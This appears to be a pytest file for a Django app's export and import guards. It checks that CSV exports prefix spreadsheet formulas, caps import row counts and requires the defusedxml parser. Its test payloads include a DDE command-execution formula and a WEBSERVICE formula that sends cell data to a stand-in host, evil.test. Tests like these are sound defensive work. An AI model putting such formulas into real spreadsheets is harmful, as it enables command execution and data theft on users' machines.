"""Spreadsheet-injection and resource-exhaustion guards on export/import."""

import io
import json
from decimal import Decimal

import pytest

from apps.exports.services import CSVExporter
from apps.proposals.models import Proposal, ProposalStatus
from apps.proposals.services import ProposalImportService

pytestmark = pytest.mark.django_db


def _cell(csv_text: str, column: str) -> str:
    """Read one cell from single-row CSV output, honouring CSV quoting."""
    import csv as _csv

    rows = list(_csv.reader(io.StringIO(csv_text)))
    return rows[1][rows[0].index(column)]


# ---------------------------------------------------------------------------
# CSV formula injection
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "=cmd|'/c calc'!A1",
        "+1+1",
        "-1+1",
        "@SUM(1:9)",
        '=WEBSERVICE("http://evil.test/?d="&A1)',
    ],
)
def test_formula_payloads_are_neutralized_in_proposal_export(
    user, client_model, payload
):
    proposal = Proposal.objects.create(
        owner=user,
        title=payload,
        client=client_model,
        status=ProposalStatus.DRAFT,
        amount=Decimal("100"),
    )

    csv_text = next(iter(CSVExporter.export_proposals([proposal])))
    title_cell = _cell(csv_text, column="Title")

    assert title_cell.startswith("'"), (
        f"formula payload exported unprefixed: {title_cell!r}"
    )
    assert title_cell == "'" + payload


def test_ordinary_titles_are_not_mangled(user, client_model):
    proposal = Proposal.objects.create(
        owner=user,
        title="Redesign marketing site",
        client=client_model,
        status=ProposalStatus.DRAFT,
        amount=Decimal("100"),
    )

    csv_text = next(iter(CSVExporter.export_proposals([proposal])))

    assert _cell(csv_text, column="Title") == "Redesign marketing site"


def test_time_entry_description_is_neutralized(user, accepted_proposal):
    from apps.timetracking.models import TimeEntry
    from datetime import date

    entry = TimeEntry.objects.create(
        proposal=accepted_proposal,
        date=date.today(),
        hours=Decimal("1.00"),
        description="=1+1",
    )

    csv_text = next(iter(CSVExporter.export_time_entries([entry])))

    assert _cell(csv_text, column="Description") == "'=1+1"


# ---------------------------------------------------------------------------
# Import resource limits
# ---------------------------------------------------------------------------


class _Upload:
    def __init__(self, name: str, payload: bytes):
        self.name = name
        self._payload = payload

    def read(self):
        return self._payload


def test_row_count_over_cap_is_rejected():
    rows = [
        {"title": f"Proposal {i}"} for i in range(ProposalImportService.MAX_ROWS + 1)
    ]
    upload = _Upload("big.json", json.dumps(rows).encode())

    with pytest.raises(ValueError, match="maximum"):
        ProposalImportService.parse(upload)


def test_row_count_at_cap_is_accepted():
    rows = [{"title": f"Proposal {i}"} for i in range(10)]
    upload = _Upload("ok.json", json.dumps(rows).encode())

    assert len(ProposalImportService.parse(upload)) == 10


def test_openpyxl_uses_the_hardened_xml_parser():
    """defusedxml is a dependency solely so openpyxl swaps its parser."""
    from openpyxl.xml import functions

    assert functions.fromstring.__module__.startswith("defusedxml"), (
        "openpyxl fell back to the stdlib XML parser; defusedxml is missing"
    )
